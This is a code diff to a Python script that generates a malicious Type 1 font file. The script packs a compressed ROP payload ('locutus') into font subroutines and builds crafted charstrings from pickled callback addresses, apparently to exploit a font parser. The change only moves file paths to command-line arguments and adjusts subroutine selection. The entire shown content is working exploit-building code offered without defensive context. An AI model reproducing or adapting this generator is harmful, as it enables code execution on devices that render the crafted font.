@@ -34,11 +34,11 @@
 
 #/0 string currentfile readstring
 
-import struct
+import struct, sys
 import cPickle as pickle
 import zlib
 
-stuff = [pickle.load(open('../catalog/dejavu.txt')), pickle.load(open('../catalog/dejavu.txt'))]
+stuff = [pickle.load(open(i)) for i in sys.argv[3:]]
 
 def xrepr(number, large_int):
     number %= (2**32)
@@ -74,7 +74,7 @@ def encode_unknown(s):
 subrs = {}
 
 # this is read by the ROP stuff
-locutus = open('../locutus/locutus').read()
+locutus = open(sys.argv[2]).read()
 locutus_len = len(locutus)
 subr0 = zlib.compress(locutus, 9)
 zlocutus_len = len(subr0)
@@ -186,10 +186,12 @@ subrs['main'] = \
           0 0 0 64 64 seac % 64 = @
           endchar          % unnecessary if it worked''' \
           .format(twenty=-(0 - 1), go_up_amount = -(344 - 7 - 0))
-#4 27 callothersubr     % 0 <= it ? 1 : 2
 
-for idx, data in enumerate(stuff):
-    subrno = [2, 1][idx]
+subrs[1] = 'return'
+subrs[2] = 'return'
+
+for data in stuff:
+    subrno = 1 if (data['actual_parse_callback'] & 1) else 2
     assert data['parse_callback'] > 32000
     assert data['actual_parse_callback'] > 32000
     
@@ -226,6 +228,7 @@ for idx, data in enumerate(stuff):
         subr += xrepr_plus_small(number, False, [4]) + ' callsubr '
     
     subr += 'return'
+    assert subrs[subrno] == 'return'
     subrs[subrno] = subr
 
 num_bca = 3 << 16 
@@ -241,4 +244,4 @@ template = template.replace('%NUMSUBRS%', '%d' % (len(subrs) - 1))
 template = template.replace('%SUBRS%', subrtext)
 template = template.replace('%TERMFUN%', '\x1b[2t\x1b[5t'*1000)
 
-open('dejavu.raw', 'w').write(template)
+open(sys.argv[1], 'w').write(template)
